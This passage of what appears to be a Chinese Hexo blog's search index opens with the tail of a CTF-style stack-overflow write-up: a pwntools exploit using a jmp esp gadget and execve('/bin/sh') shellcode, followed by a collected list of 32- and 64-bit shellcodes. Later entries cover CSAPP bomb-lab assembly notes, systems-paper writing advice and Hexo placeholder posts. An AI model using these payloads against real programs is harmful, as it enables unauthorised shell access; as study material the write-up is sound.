class="hljs-char escape_">\x68</span>\x2f\x2f<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span><span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x89</span>\xe2<span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span><br><span class="hljs-variable">jmpesp</span><span class="hljs-operator">=</span><span class="hljs-number">0x08048667</span><br><span class="hljs-variable">payload</span><span class="hljs-operator">=</span><span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">A</span>&#x27;<span class="hljs-operator">*</span>(<span class="hljs-number">0x1c</span><span class="hljs-operator">+</span><span class="hljs-number">4</span>)<span class="hljs-operator">+</span><span class="hljs-title function_">p32</span>(<span class="hljs-variable">jmpesp</span>)<span class="hljs-operator">+</span><span class="hljs-variable">shellcode</span><br><span class="hljs-variable">p</span>.<span class="hljs-property">sendlineafter</span>(<span class="hljs-string">&quot;input your name&quot;</span>,<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p</span>.<span class="hljs-property">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整理了一些shellcode:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"># <span class="hljs-number">32</span>位 短字节shellcode <span class="hljs-comment">--&gt; 21字节</span><br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80<br><br># <span class="hljs-number">32</span>位 纯ascii字符shellcode<br>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA<br><br># <span class="hljs-number">32</span>位 scanf可读取的shellcode<br>\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh<br><br># <span class="hljs-number">64</span>位 scanf可读取的shellcode <span class="hljs-number">22</span>字节<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 较短的shellcode  <span class="hljs-number">23</span>字节<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05<br><br># <span class="hljs-number">64</span>位 纯ascii字符shellcode<br>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——二进制炸弹——汇编指令积累</title>
    <link href="/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/09/14/CSAPP%E2%80%94%E2%80%94%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3:"></a>phase_3:</h2><pre><code class="hljs">JG   ;有符号大于则跳转(前&gt;后)JA   ;无符号大于则跳转( “无符号”一词表示只能包含正数的变量。)je   ;相等跳转 (左操作数=右操作数)jmpq *0x402390(,%rax,8)   ;用于直接跳转到存储在的绝对地址 8 * %rax + 0x402390cmpl source dest   ;source&lt;dest则CF=1,否则CF=00x8 (%rsp)   ;表示“获取栈上距离栈指针 %rsp 8 个字节的位置，然后获取该地址处的值。lea eax，[addr]   ;将表达式addr的值放入eax寄存器</code></pre><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmpl</span>   $<span class="hljs-number">0</span>x7,<span class="hljs-number">0</span>x8(%rsp)# 第一个数必须小于<span class="hljs-number">7</span>，否则爆炸<br><span class="hljs-attribute">ja</span>     <span class="hljs-number">400</span>fad# 引爆炸弹<br></code></pre></td></tr></table></figure><p>以上两句汇编等同于 if (*rsp+8) &gt; 7, 跳转到0x400fad， 因此第一个数必须不大于7。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jmpq</span> *<span class="hljs-number">0</span>x402470(,%rax,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于0x402470。%rax取值为[0, 7]，代表switch语句中8条不同的case。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4:"></a>phase_4:</h2><pre><code class="hljs">    Test   ;普遍的用法是用来测试一方寄存器是否为空：</code></pre><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ecx, ecx<br>jz somewhere<br></code></pre></td></tr></table></figure><p>如果ecx为零，设置ZF零标志为1，jz跳转。</p><pre><code class="hljs">    JBE命令时，如果此时的CF标志位或者ZF标志位为1，跳转，其他不跳转    SHR   ;（右移）指令使目的操作数逻辑右移一位，最高位用 0 填充。    SAR   ;（算术右移）指令将目的操作数进行算术右移：    lea (%rax,%rsi,1),%ecx   ;作用是ecx=rax+rsi*1    cmp %edi,%ecx     jle 400ff2      ;若ecx≤edi，则跳转到400ff2    cmp %edi,%ecx    jge 401007     ；若ecx≥edi，则跳转到401007</code></pre><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><pre><code class="hljs">    xor eax,eax</code></pre><p>eax异或eax，相同为0，并把结果存放到eax，简单说该语句就是想eax寄存器清零。<br></p><p><strong>windows x64寄存器命名规则</strong></p><pre><code class="hljs">    前缀R    表示64位寄存器。例如RAX。    前缀E    表示32位寄存器。例如EAX    后缀L    表示寄存器的低8位    后缀H    表示寄存器的9~16位</code></pre><p><img src="https://github.com/xhsy0314/Task/assets/84487619/86dfc5a1-ba28-4d9a-902e-75206d2d355c"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>系统论文——How (and How Not) to Write a Good Systems Paper</title>
    <link href="/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/"/>
    <url>/2023/09/14/%E7%B3%BB%E7%BB%9F%E8%AE%BA%E6%96%87%E2%80%94%E2%80%94How-and-How-Not-to-Write-a-Good-Systems-Paper/</url>
    
    <content type="html"><![CDATA[<h1 id="How-and-How-Not-to-Write-a-Good-Systems-Paper"><a href="#How-and-How-Not-to-Write-a-Good-Systems-Paper" class="headerlink" title="How (and How Not) to Write a Good Systems Paper"></a>How (and How Not) to Write a Good Systems Paper</h1><p><strong>论文类别</strong>:</p><ul><li>它通过对整个系统的全球调查或通过对系统中具体主题的选择性审查，呈现了一个真实的系统。</li><li>它提供了一个未实现的系统，但使用了您认为技术社区应该知道的想法或技术。</li><li>它涉及理论领域的一个主题，例如性能建模或安全验证。</li></ul><p><strong>系统论文写作30问</strong>:</p><ul><li>论文中的想法是新的吗？</li><li>你怎么知道该想法是不是新的？</li><li>能简明扼要地陈述这个新想法吗？</li><li>问题究竟在解决什么？</li><li>这些想法是否足以证明一篇论文的合理性？</li><li>所描述的工作是否与现有工作有显著不同？</li><li>是否引用了所有相关工作，并且实际阅读了引用材料？</li><li>与以前工作的比较是否清晰明确？</li><li>工作是否包括重要的扩展、验证或否定早期但未经证实的想法？</li><li>引用的最早的和最新的论文是什么？</li></ul><hr><ul><li>这篇论文是否描述了一些实际上已经存在的东西？</li><li>如果系统已经实施，如何使用它，以及这种用法是否表明了这些想法的实际重要性？</li><li>如果这个系统还没有实施，那么这些想法现在是否值得发表？</li></ul><hr><ul><li>你从工作中学到了什么？</li><li>读者应该从论文中学到什么？</li><li>这些经验教训的普遍适用性如何？</li></ul><hr><ul><li>在不同点考虑了哪些替代方案，为什么会做出这样的选择？</li><li>这些选择被证明是正确的吗？</li></ul><hr><ul><li>这项工作所基于的假设是什么？</li><li>这些假设现实吗？</li><li>工作对这些假设的扰动有多敏感？</li><li>如果提出一个正式的模型，它会提供新的信息和见解吗？</li></ul><hr><ul><li>介绍材料中是否包含与您主要开发所不相关的描述？</li><li>是否从以前出版的作品中包含了足够的材料，使你的读者能够遵循你的论点？</li></ul><hr><ul><li>这些想法是否以清晰和合乎逻辑的方式组织和呈现？</li><li>术语在使用之前是否定义？</li><li>前向引用是否保持在最低限度？（避免出现大量 “稍后将详细描述XXX（一个陌生术语）……”）</li><li>是否考虑了替代组织？（对这一点不太理解）</li><li>是先写的摘要吗？它传达了论文的重要思想吗？</li><li>论文写完了吗？</li></ul><hr><ul><li>文字是否清晰简洁？</li><li>单词的拼写和使用是否正确？</li><li>句子是否完整且语法正确？</li><li>是否避免歧义、俚语和口语化？</li></ul><hr><p>原文链接：<a href="https://www.usenix.org/legacy/events/samples/submit/advice.html">https://www.usenix.org/legacy/events/samples/submit/advice.html</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文献综述——The structure of paperreport in Systems</title>
    <link href="/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/"/>
    <url>/2023/09/14/%E6%96%87%E7%8C%AE%E7%BB%BC%E8%BF%B0%E2%80%94%E2%80%94The-structure-of-paperreport-in-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="The-structure-of-paperreport-in-Systems"><a href="#The-structure-of-paperreport-in-Systems" class="headerlink" title="The structure of paperreport in Systems"></a>The structure of paperreport in Systems</h1><p>some rules：</p><ul><li>1.在每个部分中，第一段应该是本节的摘要&#x2F;概述。可以先说：“在本节中，我们将介绍……”</li><li>2.在每个段落中，第一行（或第二行）应该对应于段落的摘要。</li><li>3.自上而下：从高层次开始，从高层次开始慢慢增加细节。</li><li>4.总长度：~15 页。</li></ul><p><strong>摘要</strong>[1段200-300字]</p><p>1-2行：本文的目标<br>1-2行：工作的动机和重要性<br>1-2行：结合我们工作的结果或贡献 <em>[尽量引用直观或易于解释的指标的数字来量化你的主张]</em></p><p><strong>引言</strong> [1-1.5页]</p><ul><li>(1段)问题是什么，动机，重要性，主要贡献</li><li>(1段)问题：高层次的定义，意义</li><li>(1段)以前的工作[每篇相关论文最多一行，为下一节留下详细信息]</li><li>(1段)我们的贡献：可能的结果和贡献</li><li>“本文的其余部分结构如下。在第 2 节中,…..”</li></ul><p><strong>背景和模型</strong> [1-1.5 页]</p><ul><li>(1段)定义、场景、模型</li><li>(1段)以前的工作 [仅当这有助于显示出自己的工作是不同的或更好的时才提供详细信息。]</li><li>(1段)以前工作的弱点或你提出的东西的缺点</li><li>(1段)工作的假设和局限性。[诚实，但不要谴责你的工作]。</li></ul><p><strong>我们的想法</strong> [根据需要]</p><ul><li>(1段)创新点概述</li><li>(多段)它是什么以及它是如何工作的</li><li>(多段) 解释细节</li></ul><p><strong>分析</strong> [根据需要]</p><ul><li>(1段)在本节中证明的内容概述</li><li>(1段)特定于分析的定义 [将在证明中使用的图形结构]</li><li>(多段)分析 - 证明</li><li>(1段)注释 - 直观或实用层面的证明的含义</li></ul><p><strong>实验结果</strong> [根据需要]</p><ul><li>(1段)实验概述：我们做什么，我们不做什么，为什么</li><li>(1段)模拟模型或测量基础设施</li><li>(多段)实验结果<ul><li>使用标题（粗体）区分实验</li><li>每个图都应该有一个明确的出现原因</li><li>解释每个图： 轴，我们看到的，趋势是什么，为什么这是趋势</li><li>统计注释将加强您的结果：置信区间，相关系数等。</li><li>每个数字应该是独立且不言自明：标题应该是可读的，并且可理解的。</li><li>评论，讨论，解释</li></ul></li></ul><p><strong>讨论</strong> [1-2 页]<br><br>可以通过以下方式加强工作的重要性：<br>  <em>a）重要性 b）与其他作品的关系 c）可能的实际应用</em></p><br><p><strong>结论</strong> [1-1.5]<br><br>[结论非常重要。不要指望读者记得你告诉他&#x2F;她的一切。]</p><ul><li>(1段)概述这项工作的内容。</li><li>(1段)主要成果和贡献</li><li>(1段)对重要性的评论或实际使用的技巧 [您的结果或经验如何在实践中帮助某人或另一位研究人员使用您的模拟器或避免陷阱]</li><li>(1段)未来工作。强调工作的重要性，但避免发表你的想法]。</li></ul><p><strong>参考文献</strong><br><br>[必须正确、完整、准确]<br></p><p><strong>附录</strong>[根据需要]<br><br>附录可以写任何想写的东西：审稿人没有义务通读它们。建议用途：</p><pre><code class="hljs">a）提供额外的结果，以加强您的论点，但不重要b）通过在此处放置冗长的证明或讨论细节来保持论文的流畅性c）解决一个表明你已经深入思考过这个问题的问题</code></pre><p>原文链接：<a href="http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html">http://www.cs.ucr.edu/~michalis/TECHWRITING/structure.html</a> —— <em>Michalis Faloutsos U.C. Riverside</em></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>first article</title>
    <link href="/2023/09/13/first-article/"/>
    <url>/2023/09/13/first-article/</url>
    
    <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>图片测试：</p><p><img src="http://mculover666.cn/blog/20191031/R4mWMXsrRKxu.png?imageslim"></p><p>引用测试：</p><blockquote><p>这是一条引用</p></blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p><ul><li>哈哈</li><li>嘿嘿</li><li>吼吼</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/09/13/hello-world/"/>
    <url>/2023/09/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
